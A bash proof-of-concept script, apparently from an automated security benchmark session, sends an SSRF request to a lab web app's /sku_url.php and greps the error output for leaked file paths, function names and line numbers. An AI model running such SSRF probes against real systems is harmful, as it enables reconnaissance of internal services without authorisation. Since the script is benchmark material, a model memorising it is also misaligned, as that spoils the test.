#!/bin/bash
# POC: Demonstrates information disclosure via debug error messages that expose file paths, function names, and line numbers in production environment
# Target: ./repo
# Created: 2025-12-01T15:50:32.449Z
# Session: benchmark-XBEN-092-24-minbdcli

# Information Disclosure - Debug Error Messages POC
# This POC demonstrates how debug error messages expose sensitive information
# including file paths, function names, and line numbers

TARGET_URL="${1:-http://localhost:8081}"
OUTPUT_FILE="/tmp/error_response.txt"

echo "[*] Information Disclosure - Debug Error Messages POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: SSRF to non-existent internal service
echo "[*] Test 1: Triggering error via SSRF to non-existent service"
echo "[*] Sending POST request to /sku_url.php with invalid URL..."
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL/sku_url.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.2:4455" 2>&1)

echo "[*] Response received:"
echo "$RESPONSE" | tee "$OUTPUT_FILE"
echo ""

# Check for sensitive information disclosure
echo "[*] Analyzing response for information disclosure..."
echo ""

# Check for file path disclosure
if echo "$RESPONSE" | grep -q "/var/www/html/"; then
    echo "[!] VULNERABILITY CONFIRMED: File path disclosed"
    FILE_PATH=$(echo "$RESPONSE" | grep -oP '/var/www/html/[^ "]+' | head -1)
    echo "    File path: $FILE_PATH"
    echo ""
fi

# Check for function name disclosure
if echo "$RESPONSE" | grep -q "file_get_contents"; then
    echo "[!] VULNERABILITY CONFIRMED: Function name disclosed"
    echo "    Function: file_get_contents()"
    echo ""
fi

# Check for line number disclosure
if echo "$RESPONSE" | grep -oP 'line \d+' > /dev/null; then
    echo "[!] VULNERABILITY CONFIRMED: Line number disclosed"
    LINE_NUM=$(echo "$RESPONSE" | grep -oP 'line \d+' | head -1)
    echo "    $LINE_NUM"
    echo ""
fi

# Check for error type disclosure
if echo "$RESPONSE" | grep -q "Connection refused"; then
    echo "[!] VULNERABILITY CONFIRMED: Error type disclosed"
    ERROR_TYPE=$(echo "$RESPONSE" | grep -oP 'Failed to open stream: [^i]*' | head -1)
    echo "    Error: $ERROR_TYPE"
    echo ""
fi

# Summary
echo "[*] Summary:"
if echo "$RESPONSE" | grep -qE "(file_get_contents|/var/www/html|line \d+)"; then
    echo "[+] Information disclosure vulnerability CONFIRMED"
    echo "[+] The application exposes:"
    echo "    - Internal file paths"
    echo "    - Function names and implementation details"
    echo "    - Exact line numbers where errors occur"
    exit 0
else
    echo "[-] Could not confirm information disclosure"
    exit 1
fi